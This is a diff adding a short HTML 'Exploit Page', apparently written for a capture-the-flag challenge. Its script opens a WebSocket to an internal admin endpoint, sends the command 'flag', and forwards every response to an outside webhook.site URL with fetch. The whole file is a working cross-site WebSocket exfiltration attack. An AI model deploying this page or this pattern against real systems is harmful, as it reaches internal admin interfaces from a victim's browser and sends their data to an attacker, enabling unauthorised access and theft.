@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Exploit Page</title>
+</head>
+<body>
+    <script>
+        // Step 1: Open a WebSocket connection to the target server
+        var ws = new WebSocket("ws://web:8080/admin/ws"); // Internal server URL
+
+        // Step 2: When the connection is established, send the 'flag' command
+        ws.onopen = function() {
+            ws.send("flag");
+        };
+
+        // Step 3: Listen for the response (the flag) and forward it to your Webhook.site URL
+        ws.onmessage = function(event) {
+            // Send the flag to your Webhook URL
+            fetch("https://webhook.site/e557236e-aff5-4af6-9d50-1f7c6025810d?q=" + encodeURIComponent(event.data));
+        };
+
+        // Optional: Close WebSocket connection after receiving the message
+        ws.onclose = function() {
+            console.log("WebSocket connection closed.");
+        };
+    </script>
+</body>
+</html>
